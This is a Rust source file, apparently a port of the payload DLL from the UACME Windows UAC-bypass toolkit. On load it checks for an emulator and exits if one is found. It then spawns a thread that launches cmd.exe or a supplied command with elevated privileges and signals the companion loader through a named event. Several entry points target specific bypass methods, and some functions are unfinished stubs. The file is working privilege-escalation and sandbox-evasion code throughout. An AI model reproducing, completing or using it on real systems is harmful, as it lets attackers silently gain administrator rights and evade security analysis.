// UACME Rust - Fubuki Payload DLL
// Port of Source/Fubuki

use shared::*;
use windows::core::PCWSTR;
use windows::Win32::Foundation::*;
use windows::Win32::System::SystemServices::*;
use windows::Win32::System::Threading::*;
use std::ffi::c_void;

/// Shared parameter block (must match Akagi's definition)
#[repr(C)]
struct SharedParams {
    crc32: u32,
    session_id: u32,
    akagi_flag: u32,
    parameter: [u16; MAX_PATH as usize + 1],
    desktop: [u16; MAX_PATH as usize + 1],
    winstation: [u16; MAX_PATH as usize + 1],
    signal_object: [u16; MAX_PATH as usize + 1],
}

impl Default for SharedParams {
    fn default() -> Self {
        Self {
            crc32: 0,
            session_id: 0,
            akagi_flag: 0,
            parameter: [0; MAX_PATH as usize + 1],
            desktop: [0; MAX_PATH as usize + 1],
            winstation: [0; MAX_PATH as usize + 1],
            signal_object: [0; MAX_PATH as usize + 1],
        }
    }
}

/// Launch payload with elevated privileges
fn launch_payload(parameter: Option<&[u16]>) -> bool {
    let payload = if let Some(param) = parameter {
        param.to_vec()
    } else {
        // Default payload: cmd.exe
        let mut sys_dir = query_system_directory(true);
        let cmd = to_wide_string("cmd.exe");
        wstrcat(sys_dir.as_mut_ptr(), cmd.as_ptr());
        sys_dir
    };
    
    // Create process
    match winapi_ext::create_process_simple(&payload, None, 1) {
        Ok(pi) => {
            unsafe {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
            }
            true
        }
        Err(e) => {
            log::error!("Failed to launch payload: {}", e);
            false
        }
    }
}

/// Read shared parameters from shared memory section
fn read_shared_parameters() -> Option<SharedParams> {
    // TODO: Implement shared memory reading
    // This would involve opening the shared section created by Akagi
    // and reading the SharedParams structure
    None
}

/// Set completion event to signal Akagi
fn set_completion(signal_object_name: &[u16]) {
    use windows::Win32::System::Threading::*;
    
    unsafe {
        let event = OpenEventW(
            EVENT_MODIFY_STATE,
            false,
            PCWSTR(signal_object_name.as_ptr()),
        );
        
        if let Ok(event) = event {
            let _ = SetEvent(event);
            let _ = CloseHandle(event);
        }
    }
}

/// Default payload execution
fn default_payload() {
    // Check for emulator
    if anti_emulator::is_emulator_present() == constants::STATUS_NEEDS_REMEDIATION {
        exit_process(0x666F6666); // 'foff'
    }
    
    // Try to read shared parameters
    let shared_params = read_shared_parameters();

    // Launch payload and signal completion
    let success = if let Some(params) = shared_params {
        let param = if params.parameter[0] != 0 {
            Some(&params.parameter[..])
        } else {
            None
        };

        let result = launch_payload(param);

        // Signal completion
        set_completion(&params.signal_object[..]);

        result
    } else {
        launch_payload(None)
    };

    exit_process(if success { 1 } else { 0 });
}

/// DLL Main entry point
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    _hinst_dll: HINSTANCE,
    fdw_reason: u32,
    _lpv_reserved: *mut c_void,
) -> BOOL {
    match fdw_reason {
        DLL_PROCESS_ATTACH => {
            // Check for emulator
            if anti_emulator::is_emulator_present() == constants::STATUS_NEEDS_REMEDIATION {
                exit_process(0x666F6666); // 'foff'
            }
            
            // Spawn thread to execute payload
            std::thread::spawn(|| {
                default_payload();
            });
            
            TRUE
        }
        DLL_PROCESS_DETACH => TRUE,
        _ => TRUE,
    }
}

/// Entry point for EXE mode
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn EntryPointExeMode() {
    if anti_emulator::is_emulator_present() == constants::STATUS_NEEDS_REMEDIATION {
        exit_process(0x666F6666);
    }
    default_payload();
}

/// Entry point for UI Access loader
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn EntryPointUIAccessLoader() {
    if anti_emulator::is_emulator_present() == constants::STATUS_NEEDS_REMEDIATION {
        exit_process(0x666F6666);
    }
    
    // Get command line parameter
    use windows::Win32::System::Environment::*;
    
    unsafe {
        let cmdline = GetCommandLineW();
        let mut buffer = vec![0u16; MAX_PATH as usize * 2];
        
        let (success, _) = get_command_line_param_w(
            cmdline.0,
            0,
            buffer.as_mut_ptr(),
            (MAX_PATH * 2) as u32,
        );
        
        if success && buffer[0] != 0 {
            // Execute UI hack
            // TODO: Implement UI access execution
            log::info!("UI Access loader with parameter");
        }
    }
    
    exit_process(0);
}

/// Entry point for UI Access loader 2
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn EntryPointUIAccessLoader2() {
    if anti_emulator::is_emulator_present() == constants::STATUS_NEEDS_REMEDIATION {
        exit_process(0x666F6666);
    }
    
    // TODO: Implement UI access execution variant 2
    log::info!("UI Access loader 2");
    
    exit_process(0);
}

/// Entry point for SXS Consent method
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn EntryPointSxsConsent(
    _hinst_dll: HINSTANCE,
    fdw_reason: u32,
    _lpv_reserved: *mut c_void,
) -> BOOL {
    match fdw_reason {
        DLL_PROCESS_ATTACH => {
            if anti_emulator::is_emulator_present() == constants::STATUS_NEEDS_REMEDIATION {
                exit_process(0x666F6666);
            }
            
            std::thread::spawn(|| {
                default_payload();
            });
            
            TRUE
        }
        _ => TRUE,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_shared_params_size() {
        // Ensure struct size matches C version
        assert_eq!(
            std::mem::size_of::<SharedParams>(),
            std::mem::size_of::<u32>() * 3 + (MAX_PATH + 1) * 2 * 4
        );
    }
}

